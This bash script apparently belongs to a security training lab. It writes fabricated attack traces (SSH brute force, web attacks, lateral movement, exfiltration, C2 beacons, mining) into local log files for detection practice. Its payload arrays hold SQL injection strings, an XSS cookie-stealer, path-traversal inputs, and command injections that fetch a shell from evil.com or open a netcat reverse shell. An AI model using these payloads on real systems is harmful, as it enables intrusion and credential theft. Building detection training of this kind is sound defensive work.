#!/bin/bash

# Enhanced NoSleep-Ops Attack Simulation Suite
# Realistic multi-vector attack patterns for advanced training

echo "[+] Enhanced Attack Simulation Suite v2.0"
echo "=========================================="

# Configuration
LOG_DIR="/var/log"
APACHE_LOG="$LOG_DIR/apache2/access.log"
AUTH_LOG="$LOG_DIR/auth.log"
SYSLOG="$LOG_DIR/syslog"
AUDIT_LOG="$LOG_DIR/audit/audit.log"

# Ensure log directories exist
mkdir -p /var/log/apache2 /var/log/audit

# Advanced SSH Brute Force with Credential Stuffing
simulate_advanced_ssh_attacks() {
    echo "[+] Simulating advanced SSH attacks..."
    
    # Common usernames for realistic attacks
    USERNAMES=("admin" "root" "administrator" "user" "test" "guest" "oracle" "postgres" "mysql" "www-data" "ubuntu" "centos" "jenkins" "git" "ftp")
    
    # Realistic attack patterns
    ATTACK_PATTERNS=("dictionary" "credential_stuffing" "targeted" "spray")
    
    for pattern in "${ATTACK_PATTERNS[@]}"; do
        case $pattern in
            "dictionary")
                echo "[+] Dictionary attack pattern..."
                for i in {1..5}; do
                    USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
                    IP="10.0.$((RANDOM % 255)).$((RANDOM % 255))"
                    PORT="$((20000 + RANDOM % 10000))"
                    echo "$(date) sshd[$$]: Failed password for $USER from $IP port $PORT ssh2" >> $AUTH_LOG
                    echo "$(date) sshd[$$]: Disconnecting invalid user $USER $IP port $PORT: Too many authentication failures [preauth]" >> $AUTH_LOG
                    sleep 0.3
                done
                ;;
            "credential_stuffing")
                echo "[+] Credential stuffing attack..."
                LEAKED_CREDS=("admin:password123" "user:123456" "test:qwerty" "root:toor" "admin:admin")
                for cred in "${LEAKED_CREDS[@]}"; do
                    USER=$(echo $cred | cut -d: -f1)
                    IP="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
                    PORT="$((30000 + RANDOM % 10000))"
                    echo "$(date) sshd[$$]: Failed password for $USER from $IP port $PORT ssh2" >> $AUTH_LOG
                    echo "$(date) sshd[$$]: Invalid user $USER from $IP port $PORT" >> $AUTH_LOG
                    sleep 0.5
                done
                ;;
        esac
    done
}

# Advanced Web Application Attacks (OWASP Top 10)
simulate_web_attacks_advanced() {
    echo "[+] Simulating advanced web application attacks..."
    
    # SQL Injection variations
    SQLI_PAYLOADS=(
        "' OR '1'='1"
        "'; DROP TABLE users; --"
        "' UNION SELECT username,password FROM users --"
        "1' AND (SELECT SUBSTRING(@@version,1,1))='5' --"
        "' OR 1=1 LIMIT 1 OFFSET 1 --"
    )
    
    # XSS payloads
    XSS_PAYLOADS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
        "<svg onload=alert('XSS')>"
        "'><script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
    )
    
    # LFI/Directory Traversal
    LFI_PAYLOADS=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "/proc/self/environ"
        "php://filter/convert.base64-encode/resource=config.php"
    )
    
    # Command Injection
    CMD_PAYLOADS=(
        "; cat /etc/passwd"
        "| whoami"
        "&& ls -la"
        "; wget http://evil.com/shell.php"
        "| nc -e /bin/bash evil.com 4444"
    )
    
    # Generate realistic web attacks
    for i in {1..15}; do
        ATTACKER_IP="203.0.113.$((RANDOM % 255))"
        USER_AGENT="Mozilla/5.0 (compatible; AttackBot/1.0)"
        
        # Random attack type
        ATTACK_TYPE=$((RANDOM % 4))
        
        case $ATTACK_TYPE in
            0) # SQL Injection
                PAYLOAD=${SQLI_PAYLOADS[$RANDOM % ${#SQLI_PAYLOADS[@]}]}
                URL="/login.php?username=admin&password=$(echo $PAYLOAD | sed 's/ /%20/g')"
                ;;
            1) # XSS
                PAYLOAD=${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}
                URL="/search.php?q=$(echo $PAYLOAD | sed 's/ /%20/g')"
                ;;
            2) # LFI
                PAYLOAD=${LFI_PAYLOADS[$RANDOM % ${#LFI_PAYLOADS[@]}]}
                URL="/view.php?file=$PAYLOAD"
                ;;
            3) # Command Injection
                PAYLOAD=${CMD_PAYLOADS[$RANDOM % ${#CMD_PAYLOADS[@]}]}
                URL="/ping.php?host=127.0.0.1$(echo $PAYLOAD | sed 's/ /%20/g')"
                ;;
        esac
        
        echo "$ATTACKER_IP - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET $URL HTTP/1.1\" 200 1234 \"-\" \"$USER_AGENT\"" >> $APACHE_LOG
        sleep 0.4
    done
}

# Lateral Movement Simulation
simulate_lateral_movement() {
    echo "[+] Simulating lateral movement attacks..."
    
    # SMB enumeration and attacks
    INTERNAL_IPS=("10.0.1.10" "10.0.1.15" "10.0.1.20" "10.0.1.25")
    
    for ip in "${INTERNAL_IPS[@]}"; do
        echo "$(date) kernel: SMB connection attempt from 10.0.1.100 to $ip:445" >> $SYSLOG
        echo "$(date) smbd[$$]: Failed to authenticate user DOMAIN\\admin from 10.0.1.100" >> $SYSLOG
        
        # Simulate successful compromise after multiple attempts
        if [ $((RANDOM % 3)) -eq 0 ]; then
            echo "$(date) smbd[$$]: Successful authentication for DOMAIN\\backup from 10.0.1.100" >> $SYSLOG
            echo "$(date) audit[$$]: USER_LOGIN pid=$$ uid=1001 auid=1001 ses=2 msg='op=login acct=\"backup\" exe=\"/usr/sbin/sshd\" hostname=10.0.1.100 addr=10.0.1.100 terminal=ssh res=success'" >> $AUDIT_LOG
        fi
        sleep 1
    done
}

# Data Exfiltration Simulation
simulate_data_exfiltration() {
    echo "[+] Simulating data exfiltration..."
    
    # DNS tunneling
    EXFIL_DOMAINS=("data.evil.com" "tunnel.badguy.net" "exfil.attacker.org")
    
    for i in {1..8}; do
        DOMAIN=${EXFIL_DOMAINS[$RANDOM % ${#EXFIL_DOMAINS[@]}]}
        DATA_CHUNK=$(openssl rand -hex 32)
        echo "$(date) named[$$]: client 10.0.1.100#54321: query: $DATA_CHUNK.$DOMAIN IN TXT +" >> $SYSLOG
        sleep 2
    done
    
    # Large file transfers
    echo "$(date) vsftpd[$$]: CONNECT: Client \"203.0.113.50\" connected from 203.0.113.50" >> $SYSLOG
    echo "$(date) vsftpd[$$]: [anonymous] DOWNLOAD: Client \"203.0.113.50\", \"/sensitive/database_backup.sql\", 524288000 bytes" >> $SYSLOG
}

# Privilege Escalation Attempts
simulate_privilege_escalation() {
    echo "[+] Simulating privilege escalation attempts..."
    
    PRIVESC_COMMANDS=(
        "sudo -l"
        "find / -perm -4000 2>/dev/null"
        "cat /etc/passwd"
        "cat /etc/shadow"
        "ps aux | grep root"
        "netstat -tulpn"
        "crontab -l"
        "/usr/bin/find /home -name '*.ssh'"
    )
    
    for cmd in "${PRIVESC_COMMANDS[@]}"; do
        USER="www-data"
        echo "$(date) audit[$$]: EXECVE auid=33 uid=33 gid=33 ses=3 pid=$$ comm=\"$(echo $cmd | cut -d' ' -f1)\" exe=\"/bin/bash\" key=\"privesc\"" >> $AUDIT_LOG
        echo "$(date) sudo[$$]: $USER : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=$cmd" >> $AUTH_LOG
        sleep 1.5
    done
}

# C2 Communication Simulation
simulate_c2_communication() {
    echo "[+] Simulating C2 communication..."
    
    C2_SERVERS=("185.159.158.234" "94.102.49.193" "172.96.173.141")
    
    for server in "${C2_SERVERS[@]}"; do
        # HTTP beaconing
        echo "$(date) apache2[$$]: $server - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"POST /api/v1/beacon HTTP/1.1\" 200 48 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"" >> $APACHE_LOG
        
        # Suspicious outbound connections
        echo "$(date) kernel: TCP connection established: 10.0.1.100:$((40000 + RANDOM % 10000)) -> $server:443" >> $SYSLOG
        sleep 3
    done
}

# Malware-like Behavior
simulate_malware_activity() {
    echo "[+] Simulating malware-like behavior..."
    
    # File system changes
    MALWARE_FILES=("/tmp/.hidden_miner" "/var/tmp/sysupdate" "/home/user/.config/autostart/update.desktop")
    
    for file in "${MALWARE_FILES[@]}"; do
        echo "$(date) audit[$$]: PATH item=0 name=\"$file\" inode=123456 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=unconfined_u:object_r:tmp_t:s0 objtype=CREATE cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0" >> $AUDIT_LOG
        sleep 0.5
    done
    
    # Process injection attempts
    echo "$(date) kernel: Process hollowing detected: PID $$ attempting to modify PID $((1000 + RANDOM % 500))" >> $SYSLOG
    echo "$(date) audit[$$]: SYSCALL arch=c000003e syscall=101 success=no exit=-1 a0=7fff12345678 a1=2 a2=0 a3=0 items=0 ppid=1 pid=$$ auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"suspicious\" exe=\"/tmp/.hidden_miner\"" >> $AUDIT_LOG
}

# Cryptocurrency Mining Simulation
simulate_crypto_mining() {
    echo "[+] Simulating cryptocurrency mining activity..."
    
    # High CPU usage patterns
    echo "$(date) kernel: CPU usage spike detected: Process 'xmrig' consuming 98% CPU" >> $SYSLOG
    echo "$(date) systemd[1]: Started Cryptocurrency Miner (xmrig.service)" >> $SYSLOG
    
    # Network connections to mining pools
    MINING_POOLS=("pool.minexmr.com:4444" "xmr-usa-east1.nanopool.org:14444" "mine.moneropool.com:3333")
    
    for pool in "${MINING_POOLS[@]}"; do
        echo "$(date) kernel: TCP connection established: 10.0.1.100:$((50000 + RANDOM % 10000)) -> $pool" >> $SYSLOG
        sleep 1
    done
}

# Main execution function
run_attack_simulation() {
    case "$1" in
        "ssh-advanced")
            simulate_advanced_ssh_attacks
            ;;
        "web-advanced")
            simulate_web_attacks_advanced
            ;;
        "lateral-movement")
            simulate_lateral_movement
            ;;
        "data-exfiltration")
            simulate_data_exfiltration
            ;;
        "privilege-escalation")
            simulate_privilege_escalation
            ;;
        "c2-communication")
            simulate_c2_communication
            ;;
        "malware-activity")
            simulate_malware_activity
            ;;
        "crypto-mining")
            simulate_crypto_mining
            ;;
        "apt-campaign")
            echo "[+] Running full APT campaign simulation..."
            simulate_advanced_ssh_attacks
            sleep 2
            simulate_lateral_movement
            sleep 3
            simulate_privilege_escalation
            sleep 2
            simulate_data_exfiltration
            sleep 2
            simulate_c2_communication
            ;;
        "all-advanced")
            echo "[+] Running all advanced attack simulations..."
            simulate_advanced_ssh_attacks
            simulate_web_attacks_advanced
            simulate_lateral_movement
            simulate_data_exfiltration
            simulate_privilege_escalation
            simulate_c2_communication
            simulate_malware_activity
            simulate_crypto_mining
            ;;
        *)
            echo "Enhanced Attack Simulation Suite"
            echo "Usage: $0 {ssh-advanced|web-advanced|lateral-movement|data-exfiltration|privilege-escalation|c2-communication|malware-activity|crypto-mining|apt-campaign|all-advanced}"
            echo ""
            echo "Attack Types:"
            echo "  ssh-advanced      - Advanced SSH attacks (dictionary, credential stuffing)"
            echo "  web-advanced      - OWASP Top 10 attacks (SQLi, XSS, LFI, RCE)"
            echo "  lateral-movement  - SMB enumeration and lateral movement"
            echo "  data-exfiltration - DNS tunneling and large file transfers"
            echo "  privilege-escalation - Advanced privesc techniques"
            echo "  c2-communication  - Command & control beaconing"
            echo "  malware-activity  - Malware-like file system behavior"
            echo "  crypto-mining     - Cryptocurrency mining simulation"
            echo "  apt-campaign      - Full APT attack chain simulation"
            echo "  all-advanced      - Run all advanced attack types"
            exit 1
            ;;
    esac
    
    echo "[+] Enhanced attack simulation complete!"
    echo "[+] Check logs: $AUTH_LOG, $APACHE_LOG, $SYSLOG, $AUDIT_LOG"
}

# Execute the specified attack simulation
run_attack_simulation "$1" 